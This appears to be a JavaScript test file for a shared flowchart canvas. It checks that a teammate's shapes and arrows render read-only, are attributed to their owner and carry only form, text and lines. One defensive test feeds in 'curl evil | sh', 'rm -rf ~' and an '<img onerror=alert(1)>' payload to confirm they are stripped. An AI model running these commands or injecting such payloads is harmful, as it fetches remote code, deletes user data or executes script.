/* verify:flowchart — M392, a TEAMMATE'S flowchart on a shared canvas, as this
   canvas draws it (src/renderer/flowchart/shared-shapes.ts): which
   placeholders become real shapes and which stay cards, whose each one is,
   how their arrows meet ours (connector-model.ts's buildConnectorViews), and
   that nothing a placeholder carries survives the conversion but a form,
   words and lines. Every property here fails SILENTLY when broken: a peer's
   `cx1` and ours collapsing into one arrow still draws an arrow, a shape
   redrawn on every view still paints, and a stray field carried into a
   ShapePanel is invisible until something reads it. */
const { readFileSync } = require('node:fs')
const { join } = require('node:path')

const root = join(__dirname, '..', '..')
const UA = 'aaaaaaaa-0000-4000-8000-000000000001'
const UB = 'bbbbbbbb-0000-4000-8000-000000000002'

/** A placeholder as main's view hands it over (canvas-ops.ts's SharedPanel). */
const ph = (id, extra = {}) => ({ id, kind: 'terminal', title: 't', owner: UA, host: 'hosta1', x: 0, y: 0, w: 400, h: 300, z: 3, ...extra })
const shapePh = (id, extra = {}) => ph(id, { kind: 'shape', title: 'Ship?', x: 500, y: 40, w: 168, h: 104, shape: { form: 'decision', text: 'Ship?', fill: 'yellow' }, ...extra })

module.exports = async function (ok, F) {
  const S = F.shared ?? {}
  const C = F.connectors ?? {}
  const missing = ['buildPeerFlow', 'peerShapeOf', 'peerConnectorsOf'].filter((n) => typeof S[n] !== 'function').concat(typeof C.buildConnectorViews === 'function' ? [] : ['buildConnectorViews'])
  if (missing.length > 0) {
    ok('flowchart.shared.0 shared-shapes exports buildPeerFlow, peerShapeOf and peerConnectorsOf, and connector-model buildConnectorViews', false, `missing ${missing.join(',')}`)
    return
  }
  const names = new Map([[UA, 'Sam']])
  const nameOf = (u) => names.get(u)

  // Which placeholders are drawn as shapes.
  const list = [
    shapePh('hosta1_sh1'),
    shapePh('hosta1_sh2', { owner: UB, host: 'hostb1', shape: undefined }),
    shapePh('hosta1_sh3', { shape: { form: 'hexagon', text: 'x' } }),
    ph('hosta1_t1'),
    shapePh('hosta1_sh4', { w: 2, h: 3 })
  ]
  const flow = S.buildPeerFlow(list, nameOf, null)
  const sh1 = flow.shapes.find((s) => s.rect.id === 'hosta1_sh1')
  const sh4 = flow.shapes.find((s) => s.rect.id === 'hosta1_sh4')
  ok('flowchart.shared.1 a shape placeholder with a drawable record becomes a ShapePanel at the doc\'s rect and z, its record re-read; one with no record or an unknown form, and every other kind, stays a CARD; a shape\'s rect is floored at SHAPE_MIN',
    JSON.stringify(flow.shapes.map((s) => s.rect.id)) === JSON.stringify(['hosta1_sh1', 'hosta1_sh4']) &&
      JSON.stringify(flow.cards.map((c) => c.id)) === JSON.stringify(['hosta1_sh2', 'hosta1_sh3', 'hosta1_t1']) &&
      sh1?.kind === 'shape' && sh1.z === 3 && sh1.rect.x === 500 && sh1.rect.w === 168 && sh1.shape.form === 'decision' && sh1.shape.text === 'Ship?' && sh1.shape.fill === 'yellow' &&
      sh4?.rect.w === F.record.SHAPE_MIN.w && sh4.rect.h === F.record.SHAPE_MIN.h,
    JSON.stringify({ shapes: flow.shapes, cards: flow.cards.map((c) => c.id) }))

  const other = S.buildPeerFlow([shapePh('hostb1_sh9', { owner: UB, host: 'hostb1' })], nameOf, null)
  const m1 = flow.marks.get('hosta1_sh1'), m2 = other.marks.get('hostb1_sh9')
  ok('flowchart.shared.2 each drawn shape carries whose it is: the owner\'s colour (colorOf — the same colour for the same person, another for another) and their name from presence, else "a teammate" — never a user id',
    /^#[0-9a-f]{6}$/.test(m1?.colour ?? '') && m1.who === 'Sam' && m2?.who === 'a teammate' && m2.colour !== m1.colour &&
      S.buildPeerFlow([shapePh('hosta1_x')], nameOf, null).marks.get('hosta1_x')?.colour === m1.colour && !JSON.stringify([...flow.marks.values()]).includes(UA),
    JSON.stringify({ m1, m2 }))

  // Their arrows beside ours.
  const local = [
    { kind: 'terminal', rect: { id: 'n7', x: 900, y: 0, w: 400, h: 300 }, z: 1, connectors: [{ id: 'cx1', to: 'n8' }] },
    { kind: 'terminal', rect: { id: 'n8', x: 900, y: 600, w: 400, h: 300 }, z: 1 }
  ]
  const arrows = S.buildPeerFlow([
    shapePh('hosta1_sh1', { connectors: [{ id: 'cx1', to: 'n7' }, { id: 'cx2', to: 'hosta1_t1', label: 'yes' }, { id: 'cx3', to: 'nowhere' }] }),
    ph('hosta1_t1', { connectors: [{ id: 'cx1', to: 'hosta1_sh1', ends: 'both' }] })
  ], nameOf, null)
  const views = C.buildConnectorViews([...local, ...arrows.endpoints], new Map())
  const v = (id) => views.get(id)
  ok('flowchart.shared.3 a teammate\'s arrows are namespaced by their holder, marked peer, and routed against OUR panels and their placeholders alike: a shape of theirs → a panel of ours draws, → a card of theirs draws, → nothing does not; their `cx1` and ours are two arrows',
    v('hosta1_sh1/cx1')?.to === 'n7' && v('hosta1_sh1/cx1')?.peer === true && v('hosta1_sh1/cx2')?.connector.label === 'yes' &&
      v('hosta1_t1/cx1')?.connector.ends === 'both' && v('hosta1_sh1/cx3') === undefined &&
      v('cx1')?.to === 'n8' && v('cx1')?.peer === undefined && views.size === 4,
    JSON.stringify([...views.keys()]))

  // The memo: a view hands over NEW objects even for placeholders nothing changed.
  const base = [shapePh('hosta1_sh1', { connectors: [{ id: 'cx1', to: 'hosta1_t1' }] }), shapePh('hosta1_sh2'), ph('hosta1_t1')]
  const f1 = S.buildPeerFlow(base, nameOf, null)
  const f2 = S.buildPeerFlow(JSON.parse(JSON.stringify(base)), nameOf, f1)
  const moved = JSON.parse(JSON.stringify(base)); moved[1].x = 777
  const f3 = S.buildPeerFlow(moved, nameOf, f2)
  ok('flowchart.shared.4 an unchanged placeholder is handed back as the SAME shape and end objects (ShapeLayer\'s per-shape memo and the route cache hold across a view); a moved one alone is new',
    f2.shapes[0] === f1.shapes[0] && f2.shapes[1] === f1.shapes[1] && f2.endpoints.every((e, i) => e === f1.endpoints[i]) &&
      f3.shapes[0] === f2.shapes[0] && f3.shapes[1] !== f2.shapes[1] && f3.shapes[1].rect.x === 777 && f3.endpoints[0] === f2.endpoints[0] && f3.endpoints[1] !== f2.endpoints[1])

  // Inert: nothing but a form, words and lines survives.
  const hostile = S.buildPeerFlow([shapePh('hosta1_sh1', {
    command: 'curl evil | sh', cwd: '/', transcript: 'x', relay: { session: 's', program: 'p' },
    shape: { form: 'process', text: 'hi', onClick: 'x', html: '<img onerror=alert(1)>' },
    connectors: [{ id: 'cx1', to: 'hosta1_t1', run: 'rm -rf ~', automation: { kind: 'handoff' } }]
  }), ph('hosta1_t1')], nameOf, null)
  const drawn = hostile.shapes[0]
  const end = hostile.endpoints.find((e) => e.rect.id === 'hosta1_sh1')
  ok('flowchart.shared.5 INERT: a drawn peer shape holds its kind, rect, z and a record of form and words only; its end holds a rect and lines of named fields only — no command, cwd, transcript, relay, handler or automation a placeholder carries survives into anything the canvas draws',
    JSON.stringify(Object.keys(drawn).sort()) === JSON.stringify(['kind', 'rect', 'shape', 'z']) && JSON.stringify(drawn.shape) === JSON.stringify({ form: 'process', text: 'hi' }) &&
      JSON.stringify(Object.keys(end).sort()) === JSON.stringify(['connectors', 'kind', 'peer', 'rect', 'shape']) &&
      JSON.stringify(end.connectors) === JSON.stringify([{ id: 'hosta1_sh1/cx1', to: 'hosta1_t1' }]),
    JSON.stringify({ drawn, end }))

  // The wiring, read as text: the layers it feeds draw a peer shape read-only.
  const canvas = readFileSync(join(root, 'src/renderer/canvas/Canvas.tsx'), 'utf8')
  const layer = readFileSync(join(root, 'src/renderer/flowchart/ShapeLayer.tsx'), 'utf8')
  const lines = readFileSync(join(root, 'src/renderer/flowchart/ConnectorLayer.tsx'), 'utf8')
  const peerNode = (/\{peerShapes\?\.map\(\(panel\) => \{[\s\S]*?<\/>\s*\)\s*\}\)/.exec(layer) || [''])[0]
  ok('flowchart.shared.6 the wiring: SharedPlaceholderLayer is handed only the cards and the ShapeLayer the peer shapes; a peer shape gets no handles, no editor and no ports, and its press is the placeholder drag only for someone who may arrange; a peer arrow has no hit stroke',
    /<SharedPlaceholderLayer placeholders=\{peerFlow\.cards\}/.test(canvas) && /peerShapes=\{peerFlow\.shapes\}/.test(canvas) &&
      /onPeerPress=\{shared\.mayArrange && !merged \? onPeerShapePress : undefined\}/.test(canvas) && /peers: peerFlow\.endpoints/.test(canvas) &&
      /handles=\{false\}/.test(peerNode) && /editing=\{false\}/.test(peerNode) && /onPort=\{undefined\}/.test(peerNode) && /readOnly\s/.test(peerNode) &&
      /\{view\.peer !== true && \(\s*<path\s+className="connector__hit"/.test(lines),
    peerNode.slice(0, 200))
}
